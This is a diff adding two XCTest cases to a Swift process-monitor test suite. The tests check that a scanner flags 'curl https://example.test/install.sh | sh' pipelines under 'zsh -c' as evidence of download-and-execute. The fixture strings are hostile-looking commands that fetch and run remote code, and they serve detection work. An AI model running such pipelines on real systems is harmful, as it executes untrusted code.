@@ -109,6 +109,20 @@ final class ProcessMonitorTests: XCTestCase {
         XCTAssertFalse(signals.contains { $0.severity == .critical })
     }
 
+    func test_pipeTextWithoutShellCommandFlag_isNotExecutionEvidence() {
+        XCTAssertFalse(ProcessScanner.hasExplicitPipeDownloadExecution(
+            commandLine: "/bin/zsh terminal task mentions curl example.test | sh",
+            parentName: "zsh"
+        ))
+    }
+
+    func test_shellCommandFlagWithDownloadPipeline_isExecutionEvidence() {
+        XCTAssertTrue(ProcessScanner.hasExplicitPipeDownloadExecution(
+            commandLine: "/bin/zsh -c curl https://example.test/install.sh | sh",
+            parentName: "zsh"
+        ))
+    }
+
     // MARK: - Multiple processes
 
     func test_signals_multipleIssues_returnsAllSignals() {
